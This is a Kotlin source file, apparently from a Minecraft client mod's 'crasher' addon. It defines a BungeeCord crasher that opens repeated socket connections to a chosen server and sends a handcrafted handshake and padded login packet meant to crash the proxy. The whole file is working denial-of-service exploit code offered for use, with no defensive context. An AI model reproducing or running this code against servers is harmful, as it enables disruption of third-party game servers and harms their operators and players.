package su.mandora.tarasande_crasher.crasher.impl

import su.mandora.tarasande.system.base.valuesystem.impl.ValueNumber
import su.mandora.tarasande.util.extension.javaruntime.Thread
import su.mandora.tarasande_crasher.crasher.Crasher
import java.io.DataOutputStream
import java.net.Socket

class CrasherBungeeCord : Crasher("BungeeCord") {
    private val amount = ValueNumber(this, "Amount", 1.0, 10.0, 100.0, 1.0)

    override fun crash(address: String, port: Int) {
        Thread("BungeeCord-Crasher") {
            repeat(amount.value.toInt()) {
                sendBytes(address, port)
            }
        }.start()
    }

    private fun sendBytes(address: String, port: Int) {
        val socket = Socket(address, port)
        DataOutputStream(socket.getOutputStream()).apply {
            write(15)
            write(0)
            write(47)
            write(9)
            writeBytes("localhost")
            write(99)
            write(224)
            write(1)
            for (i in 0..1899) {
                write(1)
                write(0)
            }
        }
        socket.close()
    }
}
